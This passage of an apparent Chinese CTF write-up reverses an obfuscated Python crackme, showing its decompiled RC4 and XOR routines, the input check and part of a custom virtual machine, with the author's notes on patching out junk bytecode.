class=mi>187</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>83</span><span class=p>,</span> <span class=mi>153</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=mi>23</span><span class=p>,</span> <span class=mi>43</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>126</span><span class=p>,</span> <span class=mi>186</span><span class=p>,</span> <span class=mi>119</span><span class=p>,</span> <span class=mi>214</span><span class=p>,</span> <span class=mi>38</span><span class=p>,</span> <span class=mi>225</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=mi>20</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>33</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>125</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Rcon</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=mi>16777216</span><span class=p>,</span> <span class=mi>33554432</span><span class=p>,</span> <span class=mi>67108864</span><span class=p>,</span> <span class=mi>134217728</span><span class=p>,</span> <span class=mi>268435456</span><span class=p>,</span> <span class=mi>536870912</span><span class=p>,</span> <span class=mi>1073741824</span><span class=p>,</span> <span class=mh>0x80000000</span><span class=n>L</span><span class=p>,</span> <span class=mi>452984832</span><span class=p>,</span> <span class=mi>905969664</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;CalmDownBelieveU&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>p1</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span><span class=c1>#key初始化</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=p>[</span><span class=mi>61</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>58</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>177</span><span class=p>,</span> <span class=mi>180</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>248</span><span class=p>,</span> <span class=mi>192</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>238</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>29</span><span class=p>,</span> <span class=mi>215</span><span class=p>,</span> <span class=mi>190</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>p3</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>key</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>p2</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>key</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>extendKey</span> <span class=o>=</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>    <span class=n>opcode</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>extend</span><span class=p>([</span><span class=mi>69</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>179</span><span class=p>,</span> <span class=mi>67</span><span class=p>,</span> <span class=mi>209</span><span class=p>,</span> <span class=mi>20</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>169</span><span class=p>,</span> <span class=mi>205</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>212</span><span class=p>,</span> <span class=mi>160</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>20</span><span class=p>,</span> <span class=mi>155</span><span class=p>,</span> <span class=mi>157</span><span class=p>,</span> <span class=mi>253</span><span class=p>,</span> <span class=mi>52</span><span class=p>,</span> <span class=mi>71</span><span class=p>,</span> <span class=mi>174</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>134</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>184</span><span class=p>,</span> <span class=mi>203</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>210</span><span class=p>,</span> <span class=mi>57</span><span class=p>,</span> <span class=mi>151</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>241</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>52</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>238</span><span class=p>,</span> <span class=mi>205</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>194</span><span class=p>,</span> <span class=mi>159</span><span class=p>,</span> <span class=mi>230</span><span class=p>,</span> <span class=mi>165</span><span class=p>,</span> <span class=mi>211</span><span class=p>,</span> <span class=mi>221</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>217</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>202</span><span class=p>,</span> <span class=mi>185</span><span class=p>,</span> <span class=mi>207</span><span class=p>,</span> <span class=mi>226</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>88</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>58</span><span class=p>,</span> <span class=mi>73</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>230</span><span class=p>,</span> <span class=mi>246</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>151</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=mi>181</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>185</span><span class=p>,</span> <span class=mi>236</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=mi>98</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>228</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>93</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>161</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=mi>140</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>211</span><span class=p>,</span> <span class=mi>75</span><span class=p>,</span> <span class=mi>134</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>228</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>29</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=mi>188</span><span class=p>,</span> <span class=mi>51</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>209</span><span class=p>,</span> <span class=mi>165</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>248</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>18</span><span class=p>,</span> <span class=mi>152</span><span class=p>,</span> <span class=mi>71</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>114</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>p3_result</span> <span class=o>=</span> <span class=n>p3</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>FB</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>right</span> <span class=o>=</span> <span class=n>Have</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>back</span> <span class=o>=</span> <span class=n>Fun</span><span class=p>(</span><span class=n>right</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=p>[</span><span class=mi>228</span><span class=p>,</span> <span class=mi>244</span><span class=p>,</span> <span class=mi>207</span><span class=p>,</span> <span class=mi>251</span><span class=p>,</span> <span class=mi>194</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>145</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=mi>98</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=mi>208</span><span class=p>,</span> <span class=mi>155</span><span class=p>,</span> <span class=mi>38</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>225</span><span class=p>,</span> <span class=mi>98</span><span class=p>,</span> <span class=mi>206</span><span class=p>,</span> <span class=mi>234</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>214</span><span class=p>,</span> <span class=mi>137</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>86</span><span class=p>,</span> <span class=mi>180</span><span class=p>,</span> <span class=mi>66</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>234</span><span class=p>,</span> <span class=mi>90</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>189</span><span class=p>,</span> <span class=mi>166</span><span class=p>,</span> <span class=mi>117</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>156</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>174</span><span class=p>,</span> <span class=mi>47</span><span class=p>,</span> <span class=mi>144</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>160</span><span class=p>,</span> <span class=mi>45</span><span class=p>,</span> <span class=mi>239</span><span class=p>,</span> <span class=mi>211</span><span class=p>,</span> <span class=mi>11</span><span class=p>,</span> <span class=mi>190</span><span class=p>,</span> <span class=mi>181</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>234</span><span class=p>,</span> <span class=mi>114</span><span class=p>,</span> <span class=mi>174</span><span class=p>,</span> <span class=mi>27</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>p3</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>data1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=p>[</span><span class=mi>165</span><span class=p>,</span> <span class=mi>83</span><span class=p>,</span> <span class=mi>203</span><span class=p>,</span> <span class=mi>51</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>91</span><span class=p>,</span> <span class=mi>230</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>181</span><span class=p>,</span> <span class=mi>55</span><span class=p>,</span> <span class=mi>190</span><span class=p>,</span> <span class=mi>47</span><span class=p>,</span> <span class=mi>125</span><span class=p>,</span> <span class=mi>240</span><span class=p>,</span> <span class=mi>186</span><span class=p>,</span> <span class=mi>173</span><span class=p>,</span> <span class=mi>116</span><span class=p>,</span> <span class=mi>47</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>215</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>138</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>175</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>216</span><span class=p>,</span> <span class=mi>250</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>66</span><span class=p>,</span> <span class=mi>168</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>247</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>189</span><span class=p>,</span> <span class=mi>243</span><span class=p>,</span> <span class=mi>239</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>63</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>177</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>226</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>207</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>251</span><span class=p>,</span> <span class=mi>123</span><span class=p>,</span> <span class=mi>225</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>183</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>p3</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>data2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>data3</span> <span class=o>=</span> <span class=p>[</span><span class=mi>95</span><span class=p>,</span> <span class=mi>219</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>141</span><span class=p>,</span> <span class=mi>17</span><span class=p>,</span> <span class=mi>168</span><span class=p>,</span> <span class=mi>254</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>183</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>118</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>47</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>240</span><span class=p>,</span> <span class=mi>140</span><span class=p>,</span> <span class=mi>159</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>238</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data3</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>p3</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>data3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data2</span> <span class=o>==</span> <span class=n>back</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>data1</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>data3</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>p1是rc4对key的初始化，初始化出sbox，p2是一个异或，p3是rc4的加密，每次调用会改sbox，Have函数是一个打印字符串和获取输入，输入长度为64位，然后传到Fun里，Fun这个加密有点逆天</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>Fun</span><span class=p>(</span><span class=n>right</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>back</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>right</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>64</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=kc>None</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;XD&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>right</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>part1</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>right</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>8</span> <span class=p>:</span> <span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=mi>4</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>part2</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>right</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=mi>4</span> <span class=p>:</span> <span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=mi>8</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>part1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>part1</span> <span class=o>^=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>back</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=o>-</span><span class=mi>8</span> <span class=p>:</span> <span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=o>-</span><span class=mi>4</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>part2</span> <span class=o>^=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>back</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=o>-</span><span class=mi>4</span> <span class=p>:</span> <span class=n>i</span><span class=o>*</span><span class=mi>8</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>vm</span><span class=p>(</span><span class=n>part1</span><span class=err>，</span><span class=n>part2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>back</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>part1</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>part2</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>part1</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&gt;I&#39;</span><span class=p>,</span> <span class=n>part2</span><span class=p>))[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>back</span>
</span></span></code></pre></td></tr></table></div></div><p>最后发现，其实可以修的，只需要用pyspy nop一下invaild即可，虚拟机那一块没有多少花指令，所以修完只有VM函数有点问题：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>F1</span><span class=p>(</span><span class=n>part1</span><span class=p>,</span> <span class=n>part2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>REG</span>
</span></span><span class=line><span class=cl>    <span class=c1># REG = {&#39;EAX&#39;:0, &#39;EBX&#39;:0, &#39;ECX&#39;:0, &#39;EDX&#39;:0, &#39;R8&#39;:0, &#39;CNT&#39;:0, &#39;EIP&#39;:0}</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_table</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;1&#39;</span><span class=p>:</span> <span class=s1>&#39;EAX&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;2&#39;</span><span class=p>:</span> <span class=s1>&#39;EBX&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;3&#39;</span><span class=p>:</span> <span class=s1>&#39;ECX&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;4&#39;</span><span class=p>:</span> <span class=s1>&#39;EDX&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;5&#39;</span><span class=p>:</span> <span class=s1>&#39;R8&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;6&#39;</span><span class=p>:</span> <span class=s1>&#39;CNT&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;7&#39;</span><span class=p>:</span> <span class=s1>&#39;EIP&#39;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;ECX&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EDX&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;E8&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;CNT&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EAX&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>part1</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EBX&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>part2</span>
</span></span><span class=line><span class=cl><span class=n>opcode</span> <span class=o>=</span> <span class=p>[</span><span class=mi>7</span><span class=p>,</span> <span class=mi>153</span><span class=p>,</span> <span class=mi>255</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F2</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>,</span> <span class=n>v3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>REG</span><span class=p>,</span> <span class=n>reg_table</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>=</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v3</span><span class=p>)]]]</span>
